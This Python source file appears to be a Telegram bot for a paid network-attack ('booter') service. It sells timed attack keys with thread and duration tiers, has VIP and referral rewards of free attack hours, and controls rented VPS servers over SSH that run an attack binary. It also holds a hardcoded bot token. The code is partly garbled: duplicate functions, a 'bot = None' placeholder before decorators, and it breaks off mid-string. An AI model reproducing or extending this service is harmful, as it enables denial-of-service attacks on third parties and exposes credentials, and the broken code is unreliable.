import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import ipaddress
import psutil
import paramiko
from scp import SCPClient
import json
import uuid
import sqlite3
from time import sleep

# ======================
# 🛠️ BOT CONFIGURATION
# ======================
TOKEN = '7622864970:AAF5zpg202jB4m1XBKR6Bj02XGpQ3Rem8Ks'
OWNER_USERNAME = "RAJARAJ909"
ADMIN_IDS = []  # Add admin usernames here
ALLOWED_GROUP_IDS = [-1002834218110]
MAX_THREADS = 500
MAX_DURATION = 240
SPECIAL_MAX_THREADS = 900
SPECIAL_MAX_DURATION = 200
VIP_MAX_THREADS = 1500
VIP_MAX_DURATION = 300
ACTIVE_VPS_COUNT = 4
BINARY_PATH = "/home/master/raja"
BINARY_NAME = "raja"
REQUEST_DELAY = 0.3  # Delay between API requests in seconds
KEY_PRICES = {
    "10M": 10,
    "30M": 29,
    "2H": 30,
    "5H": 50,
    "1D": 150,
    "2D": 300,
    "1W": 1000,
    "VIP1D": 200,
    "VIP2D": 350
}
REFERRAL_REWARD_DURATION = 1  # Hours of free attack for referrals
PUBLIC_GROUPS = []  # List of group IDs where public attacks are allowed

# ======================
# 📦 DATA STORAGE
# ======================
keys = {}
special_keys = {}
vip_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
running_attacks = {}
reseller_balances = {}
instructor_notices = {}
VPS_LIST = []
REFERRAL_CODES = {}
REFERRAL_LINKS = {}
GROUP_SETTINGS = {}
last_attack_time = 0
global_cooldown = 120
bot_open = False

# ======================
# 🤖 BOT INITIALIZATION
# ======================
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)

# ======================
# 🔧 HELPER FUNCTIONS
# ======================
ACTIVE_VPS_COUNT = 4 # Example, adjusted to match value from deepseek.py snippet
running_attacks = {} # Example dictionary
redeemed_users = {} # Example dictionary

bot = None # Placeholder for your bot object

def safe_reply_to(message, text):
    print(f"Replying to {message.from_user.id}: {text}") # Placeholder for actual bot reply
    
def safe_send_message(chat_id, text):
    print(f"Sending message to {chat_id}: {text}") # Placeholder for actual bot send message
    return type('obj', (object,), {'message_id' : 123})() # Dummy object for msg.message_id

def safe_send_message(chat_id, text, **kwargs):
    """Send message with rate limit handling"""
    try:
        sleep(REQUEST_DELAY)
        return bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Error sending message: {e}")
        if "retry after" in str(e):
            wait_time = int(str(e).split()[-1])
            print(f"Waiting {wait_time} seconds due to rate limit")
            sleep(wait_time)
            return safe_send_message(chat_id, text, **kwargs)
        return None

def safe_reply_to(message, text, **kwargs):
    """Reply to message with rate limit handling"""
    try:
        sleep(REQUEST_DELAY)
        return bot.reply_to(message, text, **kwargs)
    except Exception as e:
        print(f"Error replying to message: {e}")
        if "retry after" in str(e):
            wait_time = int(str(e).split()[-1])
            print(f"Waiting {wait_time} seconds due to rate limit")
            sleep(wait_time)
            return safe_reply_to(message, text, **kwargs)
        return None

def is_allowed_group(message):
    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"

def is_owner(user):
    return user.username == OWNER_USERNAME

def is_admin(user):
    return user.username in ADMIN_IDS or is_owner(user)

def is_authorized_user(user):
    return str(user.id) in redeemed_users or is_admin(user)

def get_display_name(user):
    return f"@{user.username}" if user.username else user.first_name

def save_data():
    """Save all bot data to JSON files"""
    with open('keys.json', 'w') as f:
        json.dump({
            'keys': keys,
            'special_keys': special_keys,
            'vip_keys': vip_keys,
            'redeemed_users': redeemed_users,
            'redeemed_keys_info': redeemed_keys_info,
            'referral_codes': REFERRAL_CODES,
            'referral_links': REFERRAL_LINKS,
            'group_settings': GROUP_SETTINGS
        }, f)

    with open('vps.json', 'w') as f:
        json.dump(VPS_LIST, f)

def load_data():
    """Load all bot data from JSON files"""
    global keys, special_keys, vip_keys, redeemed_users, redeemed_keys_info, VPS_LIST, REFERRAL_CODES, REFERRAL_LINKS, GROUP_SETTINGS
    
    if os.path.exists('keys.json'):
        with open('keys.json', 'r') as f:
            data = json.load(f)
            keys = data.get('keys', {})
            special_keys = data.get('special_keys', {})
            vip_keys = data.get('vip_keys', {})
            redeemed_users = data.get('redeemed_users', {})
            redeemed_keys_info = data.get('redeemed_keys_info', {})
            REFERRAL_CODES = data.get('referral_codes', {})
            REFERRAL_LINKS = data.get('referral_links', {})
            GROUP_SETTINGS = data.get('group_settings', {})

    if os.path.exists('vps.json'):
        with open('vps.json', 'r') as f:
            VPS_LIST = json.load(f)

def save_admins():
    """Save admin list to file"""
    with open('admins.json', 'w') as f:
        json.dump(ADMIN_IDS, f)

def load_admins():
    """Load admin list from file"""
    global ADMIN_IDS
    if os.path.exists('admins.json'):
        with open('admins.json', 'r') as f:
            ADMIN_IDS = json.load(f)

# ======================
# ⌨️ KEYBOARD MARKUPS (STYLISH VERSION)
# ======================
def create_main_keyboard(message=None):
    """Create main menu keyboard with stylish fonts"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)

    # Common buttons
    buttons = [
        telebot.types.KeyboardButton("🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🎁 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"),
        telebot.types.KeyboardButton("🍁 𝙑𝙄𝙋 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉")
    ]

    user_id = str(message.from_user.id) if message else None
    if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict):
        if redeemed_users[user_id].get('is_vip'):
            buttons.insert(1, telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"))

    markup.add(*buttons)

    if message:
        if is_owner(message.from_user):
            admin_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*admin_buttons)
        elif is_admin(message.from_user):
            limited_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*limited_buttons)

    return markup

def create_key_management_keyboard():
    """Create stylish keyboard for key management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🔓 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("📋 𝙆𝙀𝙔 𝙇𝙄𝙎𝙏"),
        telebot.types.KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup
    
def create_vip_keyboard():
    """Create VIP menu keyboard with premium styling"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🍅 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🎁 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍁 𝙑𝙄𝙋 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉")
    ]
    markup.add(*buttons)
    return markup    

def create_vps_management_keyboard():
    """Create VPS management keyboard with tech style"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🏥 𝙑𝙋𝙎 𝙃𝙀𝘼𝙇𝙏𝙃"),
        telebot.types.KeyboardButton("⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)"),
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

def create_group_management_keyboard():
    """Create stylish group management keyboard"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧"),
        telebot.types.KeyboardButton("🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

# ======================
# 🔙 BACK TO MAIN MENU
# ======================    
@bot.message_handler(func=lambda msg: msg.text in ["🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐", "⬅️ 𝗕𝗮𝗰𝗸"])
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    safe_send_message(
        message.chat.id, 
        "🏠 𝗥𝗲𝘁𝘂𝗿𝗻𝗶𝗻𝗴 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂...",
        reply_markup=create_main_keyboard(message)
    )    

# ======================
# 🔐 ADMIN MENU HANDLERS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def key_management_menu(message):
    """Handle key management menu access with premium styling"""
    if not is_admin(message.from_user):
        safe_reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    safe_send_message(
        message.chat.id,
        "🔑 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_key_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def group_management_menu(message):
    """Handle group management menu access with premium styling"""
    if not is_admin(message.from_user):
        safe_reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    safe_send_message(
        message.chat.id,
        "👥 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_group_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def vps_management_menu(message):
    """Handle VPS management menu access with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    safe_send_message(
        message.chat.id, 
        "🖥️ 𝗩𝗣𝗦 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_vps_management_keyboard()
    )

# ======================
# 🖼️ GROUP SETTINGS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀")
def set_start_image(message):
    """Set start image for a group with stylish interface"""
    if not is_admin(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🖼️ {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    safe_reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_image)

def process_group_for_image(message):
    """Process group selection for image setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        safe_reply_to(message, "𝗜𝗺𝗮𝗴𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:].strip().lower()  # Remove prefix & normalize
    selected_group = None

    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if selected_title in chat.title.strip().lower():  # Partial and case-insensitive match
                selected_group = group_id
                break
        except Exception as e:
            print(f"[ERROR] Could not get chat info for group {group_id}: {e}")

    if not selected_group:
        safe_reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return

    safe_reply_to(message, "📷 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝘀𝗲𝘁 𝗮𝘀 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗶𝗺𝗮𝗴𝗲:")
    bot.register_next_step_handler(message, lambda msg: process_start_image(msg, selected_group))

def process_start_image(message, group_id):
    """Process the image and save it for the group with stylish confirmation"""
    if not message.photo:
        safe_reply_to(message, "❌ 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    # Get the highest resolution photo
    GROUP_SETTINGS[str(group_id)]['start_image'] = message.photo[-1].file_id
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        safe_reply_to(message, f"✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        safe_reply_to(message, "✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")

@bot.message_handler(func=lambda msg: msg.text == "📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
def set_owner_name(message):
    """Set owner name for a group with stylish interface"""
    if not is_admin(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"👑 {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    safe_reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_owner_name)

def process_group_for_owner_name(message):
    """Process group selection for owner name setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        safe_reply_to(message, "𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 👑 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        safe_reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    safe_reply_to(message, "📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿 𝘁𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽:")
    bot.register_next_step_handler(message, lambda msg: process_owner_name(msg, selected_group))

def process_owner_name(message, group_id):
    """Process and save the new owner name with stylish confirmation"""
    if not message.text or len(message.text) > 32:
        safe_reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲! 𝗠𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟯𝟮 𝗰𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝘀.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    GROUP_SETTINGS[str(group_id)]['owner_name'] = message.text
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        safe_reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text} 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        safe_reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text}")

# ======================
# 🏠 WELCOME MESSAGE (STYLISH VERSION)
# ======================
@bot.message_handler(commands=['start'])
def welcome(message):
    """Handle /start command with premium styling"""
    # Check for referral code
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        handle_referral(message, referral_code)
    
    user = message.from_user
    user_id = str(user.id)
    chat_id = message.chat.id

    now = datetime.datetime.now()
    current_time = now.strftime('%H:%M:%S')
    current_date = now.strftime('%Y-%m-%d')

    group_settings = GROUP_SETTINGS.get(str(chat_id), {})
    start_image = group_settings.get('start_image', None)
    owner_name = group_settings.get('owner_name', OWNER_USERNAME)

    username = f"@{user.username}" if user.username else user.first_name
    user_info = f"├ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n└ 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user.id}`"

    if is_owner(user):
        caption = f"""
╭━━━〔 *𝗔𝗗𝗠𝗜𝗡 𝗖𝗘𝗡𝗧𝗘𝗥* 〕━━━╮
*"Master of The Networks" — Access Granted*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🛡️ *𝗦𝗧𝗔𝗧𝗨𝗦:* `ADMIN PRIVILEGES GRANTED`  
🎉 Welcome back, Commander *{user.first_name}*

*─────⟪ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗗𝗘𝗡𝗧𝗜𝗧𝗬 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *Dashboard Ready — Execute Commands Below*
"""
        markup = create_main_keyboard(message)

    elif user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip'):
        caption = f"""
╭━━━〔 *𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦* 〕━━━╮
*"Elite Access Granted" — Welcome Onboard*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🌟 *𝗦𝗧𝗔𝗧𝗨𝗦:* `VIP MEMBER`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *VIP Panel Ready — Explore Your Powers*
"""
        markup = create_vip_keyboard()

    else:
        caption = f"""
╭━━━〔 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
*"Network Access Initiated"*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🚀 *𝗦𝗧𝗔𝗧𝗨𝗦:* `GENERAL ACCESS`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ Buy special key to unlock VIP features Dm @RAJARAJ909 !
"""
        markup = create_main_keyboard(message)

    if start_image:
        try:
            bot.send_photo(
                chat_id, 
                start_image, 
                caption=caption, 
                parse_mode="Markdown", 
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error sending welcome image: {e}")
            safe_send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
    else:
        safe_send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

# ======================
# 🖥️ VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_vps_status(message):
    """Show status of all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        safe_reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗼𝗿 𝗰𝗼-𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝗩𝗣𝗦 𝘀𝘁𝗮𝘁𝘂𝘀!")
        return
    
    if not VPS_LIST:
        safe_reply_to(message, "❌ 𝗡𝗼 𝗩𝗣𝗦 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱!")
        return
    
    msg = safe_send_message(message.chat.id, "🔄 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗩𝗣𝗦 𝘀𝘁𝘂𝘁𝘂𝘀𝗲𝘀...")
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            if ip in busy_vps_ips:
                status = "🟡 𝗕𝘂𝘀𝘆 (𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸)"
                busy_vps += 1
            else:
                status = "🟢 𝗢𝗻𝗹𝗶𝗻𝗲"
                online_vps += 1
            
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
            else:
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝘄𝗼𝗿𝗸𝗶𝗻𝗴"
                else:
                    binary_status = f"✅ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 (𝗩𝗲𝗿𝘀𝗶𝗼𝗻: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = f"""
🔹𝗩𝗣𝗦 {i+1} 𝗦𝘁𝗮𝘁𝘂𝘀
{status}
𝗜𝗣: `{ip}`
𝗨𝘀𝗲𝗿: `{username}`
𝗕𝗶𝗻𝗮𝗿𝘆: {binary_status}
"""
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = f"""
🔹 𝗩𝗣𝗦 {i+1} 𝗦𝘁𝗮𝘁𝘂𝘀
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲/𝗘𝗿𝗿𝗼𝗿
𝗜𝗣: `{ip}`
𝗨𝘀𝗲𝗿: `{username}`
𝗘𝗿𝗿𝗼𝗿: `{str(e)}`
"""
            status_messages.append(status_msg)
            offline_vps += 1
    
    summary = f"""
📊 𝗩𝗣𝗦 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝘂𝗺𝗺𝗮𝗿𝘆
